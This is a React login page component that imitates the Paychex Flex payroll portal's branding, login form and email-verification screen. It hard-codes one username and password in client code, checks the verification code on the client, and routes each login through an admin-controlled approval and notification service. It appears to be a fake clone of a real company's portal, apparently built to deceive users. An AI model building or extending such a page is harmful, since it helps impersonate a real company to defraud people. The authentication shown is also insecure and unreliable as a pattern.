import { useEffect, useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'
import { useAuth } from '../context/AuthContext.jsx'
import { IconEye, IconEyeSlash, IconChevronLeft } from '../components/icons.jsx'
import TopLoadingBar from '../components/TopLoadingBar.jsx'
import {
  createPendingRequest,
  subscribeToRequest,
  approveRequest,
} from '../services/loginRequestService.js'
import { sendLoginNotification } from '../services/emailService.js'

const VALID_USERNAME = 'EddieJ.4319'
const VALID_PASSWORD = 'Mutt1-Wingo2'
const PENDING_KEY = 'payflex_pending_login'
const REMEMBER_KEY = 'payflex_remembered_device'
const TRUSTED_KEY = 'payflex_device_trusted'

export default function Login() {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [loading, setLoading] = useState(true)
  const [signingIn, setSigningIn] = useState(false)
  const [error, setError] = useState(false)
  const [requestError, setRequestError] = useState(false)
  const [phase, setPhase] = useState('login')
  const [request, setRequest] = useState(null)
  const [code, setCode] = useState('')
  const [codeError, setCodeError] = useState(false)
  const [remember, setRemember] = useState(
    () => localStorage.getItem(REMEMBER_KEY) === '1'
  )
  const [resendNote, setResendNote] = useState(false)
  const { login } = useAuth()
  const navigate = useNavigate()
  const location = useLocation()

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 2000)
    return () => clearTimeout(t)
  }, [])

  useEffect(() => {
    if (localStorage.getItem(PENDING_KEY) !== '1') return
    if (localStorage.getItem(TRUSTED_KEY) === '1') {
      localStorage.removeItem(PENDING_KEY)
      return
    }
    setPhase('verify')
  }, [])

  useEffect(() => {
    if (phase === 'login') return
    const unsubscribe = subscribeToRequest((data) => {
      setRequest(data)
      if (!data) return
      if (data.status === 'approved') {
        localStorage.removeItem(PENDING_KEY)
        setPhase('login')
      }
    })
    return unsubscribe
  }, [phase])

  const canSubmit = username.trim() !== '' && password.trim() !== ''

  const handleLogin = (e) => {
    e.preventDefault()
    if (!canSubmit) return
    if (username.trim() !== VALID_USERNAME || password.trim() !== VALID_PASSWORD) {
      setError(true)
      return
    }
    setError(false)
    setRequestError(false)
    setSigningIn(true)
    setTimeout(() => {
      if (localStorage.getItem(TRUSTED_KEY) === '1') {
        login()
        navigate(location.state?.from || '/dashboard')
        return
      }
      const loginTime = new Date().toISOString()
      createPendingRequest(username.trim(), loginTime)
        .then(() => {
          localStorage.setItem(PENDING_KEY, '1')
          setCode('')
          setPhase('verify')
          sendLoginNotification({ username: username.trim(), loginTime }).catch((err) =>
            console.error('Failed to send admin notification email:', err)
          )
        })
        .catch(() => setRequestError(true))
        .finally(() => setSigningIn(false))
    }, 1500)
  }

  const handleRememberChange = (checked) => {
    setRemember(checked)
    if (checked) {
      localStorage.setItem(REMEMBER_KEY, '1')
    } else {
      localStorage.removeItem(REMEMBER_KEY)
    }
  }

  const handleResend = () => {
    sendLoginNotification({ username: VALID_USERNAME, loginTime: new Date().toISOString() })
      .then(() => {
        setResendNote(true)
        setTimeout(() => setResendNote(false), 3000)
      })
      .catch((err) => console.error('Failed to resend code email:', err))
  }

  const handleBackToLogin = () => {
    localStorage.removeItem(PENDING_KEY)
    setCode('')
    setCodeError(false)
    setResendNote(false)
    setPhase('login')
  }

  const handleCodeSubmit = (e) => {
    e.preventDefault()
    const entered = code.trim()
    if (!entered || !request) return
    if (request.code !== entered) {
      setCodeError(true)
      return
    }
    setCodeError(false)
    setSigningIn(true)
    approveRequest().then(() => {
      localStorage.removeItem(PENDING_KEY)
      if (remember) {
        localStorage.setItem(TRUSTED_KEY, '1')
      }
      login()
      navigate(location.state?.from || '/dashboard')
    })
  }

  return (
    <div className="min-h-screen bg-app-bg md:flex md:items-center md:justify-center md:p-6">
      <div className="mx-auto min-h-screen w-full bg-app-card md:min-h-0 md:max-w-md md:rounded-xl md:shadow-lg md:overflow-hidden">
        <div className="bg-brand pt-7 pb-8 px-4 text-center text-white">
          <div className="text-[28px] italic tracking-wide uppercase">
            <span className="font-extrabold">Paychex</span> <span className="font-semibold">Flex</span>
            <sup className="text-[11px] not-italic leading-none relative top-[-11px] ml-0.5">&reg;</sup>
          </div>
        </div>
        {(loading || signingIn) && <TopLoadingBar />}

        {phase === 'login' ? (
          <form className="px-4 pt-6 pb-10 md:px-8" onSubmit={handleLogin}>
            <div className="mb-5.5">
              <label className="block text-[13px] text-app-muted mb-1.5 font-medium">Username*</label>
              <input
                type="text"
                value={username}
              onChange={(e) => {
                setUsername(e.target.value)
                setError(false)
                setRequestError(false)
              }}
                className="w-full border-0 border-b border-[#bbb] py-2 text-base outline-none bg-transparent focus:border-brand"
              />
            </div>
            <div className="mb-2">
              <label className="block text-[13px] text-app-muted mb-1.5 font-medium">Password*</label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    setError(false)
                    setRequestError(false)
                  }}
                  className="w-full border-0 border-b border-[#bbb] py-2 pr-8 text-base outline-none bg-transparent focus:border-brand"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((v) => !v)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 bg-transparent border-none text-app-muted cursor-pointer p-1"
                >
                  {showPassword ? <IconEyeSlash className="w-5 h-5" /> : <IconEye className="w-5 h-5" />}
                </button>
              </div>
            </div>
            {error && <p className="text-[13px] text-[#c62828] mb-3.5">Incorrect username or password.</p>}
            {requestError && (
              <p className="text-[13px] text-[#c62828] mb-3.5">
                Unable to create the login request. Please try again.
              </p>
            )}
            <button
              type="submit"
              disabled={!canSubmit || signingIn}
              className={`w-full py-3.5 text-white border-none rounded font-semibold text-base mt-1 cursor-pointer ${
                canSubmit && !signingIn ? 'bg-brand' : 'bg-[#bdbdbd]'
              }`}
            >
              Log In
            </button>
            <div className="flex justify-between mt-5 text-sm">
              <a href="#" className="text-brand no-underline">Forgot username</a>
              <a href="#" className="text-brand no-underline">Forgot password</a>
            </div>
            <div className="text-center mt-6 text-sm text-app-muted">
              New to Paychex Flex? <a href="#" className="text-brand font-semibold no-underline">Sign up</a>
            </div>
            <div className="mt-8 text-[11px] text-app-muted leading-relaxed text-center">
              By continuing, you agree to our <a href="#" className="text-brand">Terms of Use</a> and{' '}
              <a href="#" className="text-brand">Privacy Policy</a>, as well as our use of cookies and other
              technologies to support site functionality, analytics, preferences, marketing, and to improve your
              experience with our services. We use third party technologies that may access your information. By
              continuing, you consent to such use. For more information, see our Cookie Policy.
            </div>
          </form>
        ) : (
          <div className="px-4 pt-6 pb-10 md:px-8">
            <button
              type="button"
              onClick={handleBackToLogin}
              aria-label="Back to login"
              className="bg-transparent border-none text-app-muted cursor-pointer p-1 -ml-1 mb-1"
            >
              <IconChevronLeft className="w-6 h-6" />
            </button>
            <h2 className="text-center text-[22px] font-semibold text-app-text">
              Check your email for verification code
            </h2>
            <p className="mt-[10px] text-center text-[15px] leading-[22px] text-[#6b6b6b]">
              You’ll have five minutes before the code expires.
            </p>

            <div className="mt-[14px] h-[52px] flex items-center px-[18px] rounded-[3px] bg-[#eeeeee] border border-[#c9c9c9] text-[#555] text-[18px]">
              e........jh@yahoo.com
            </div>

            <form onSubmit={handleCodeSubmit}>
              <input
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                autoFocus
                maxLength={6}
                value={code}
                onChange={(e) => {
                  setCode(e.target.value.replace(/\D/g, ''))
                  setCodeError(false)
                }}
                aria-label="Verification code"
                placeholder="Enter verification code"
                className="mt-[10px] block w-full h-[52px] px-[18px] rounded-[3px] bg-white border border-[#c9c9c9] text-[18px] text-black outline-none focus:border-[#2e69ae] focus:ring-1 focus:ring-[#2e69ae]"
              />
              {codeError && (
                <p className="mt-[10px] text-[13px] text-[#c62828]">Invalid verification code.</p>
              )}
              {resendNote && (
                <p className="mt-[10px] text-[13px] text-[#2e7d32]">
                  Code sent.
                </p>
              )}

              <div className="mt-[18px] flex items-start justify-between">
                <label className="flex-1 cursor-pointer select-none text-[16px] leading-[22px] text-[#222]">
                  <input
                    type="checkbox"
                    checked={remember}
                    onChange={(e) => handleRememberChange(e.target.checked)}
                    className="sr-only peer"
                  />
                  <span className="float-left mr-[10px] mt-[1px] w-[26px] h-[26px] rounded-[3px] border-2 border-[#222] bg-white flex items-center justify-center peer-focus-visible:ring-2 peer-focus-visible:ring-[#2e69ae]">
                    {remember && (
                      <svg viewBox="0 0 24 24" className="w-[20px] h-[20px]" fill="none" stroke="#222" strokeWidth={3} strokeLinecap="round" strokeLinejoin="round">
                        <path d="M5 12.5l4.5 4.5L19 7.5" />
                      </svg>
                    )}
                  </span>
                  <span className="block pt-[1px]">
                    Recognize this device in the future.
                  </span>
                </label>

                <button
                  type="button"
                  aria-label="More information"
                  className="ml-[10px] mt-[6px] shrink-0 w-[26px] h-[26px] rounded-full border-2 border-[#444] text-[#444] flex items-center justify-center"
                >
                  <svg viewBox="0 0 24 24" className="w-[16px] h-[16px]" fill="currentColor">
                    <circle cx="12" cy="6.2" r="1.9" />
                    <rect x="10.2" y="9.8" width="3.6" height="9.5" rx="0.6" />
                  </svg>
                </button>
              </div>

              <button
                type="submit"
                disabled={!code.trim() || signingIn}
                className="mt-[22px] w-full h-[54px] rounded-[3px] bg-[#2e69ae] hover:bg-[#285c9b] text-white text-[18px] font-normal transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Continue
              </button>

              <div className="mt-[22px] flex items-center justify-between text-[17px]">
                <button type="button" className="text-[#1d67a8] hover:underline">
                  Call me instead
                </button>
                <button type="button" onClick={handleResend} className="text-[#1d67a8] hover:underline">
                  Resend code
                </button>
              </div>
            </form>
          </div>
        )}
      </div>

      {phase !== 'login' && (
        <button
          type="button"
          aria-label="Help"
          className="fixed right-0 bottom-[16%] sm:bottom-[20%] w-[40px] h-[42px] sm:w-[48px] sm:h-[48px] rounded-l-[22px] bg-[#2e69ae] hover:bg-[#285c9b] text-white text-[22px] font-medium flex items-center justify-center pl-1 shadow-sm"
        >
          ?
        </button>
      )}
    </div>
  )
}
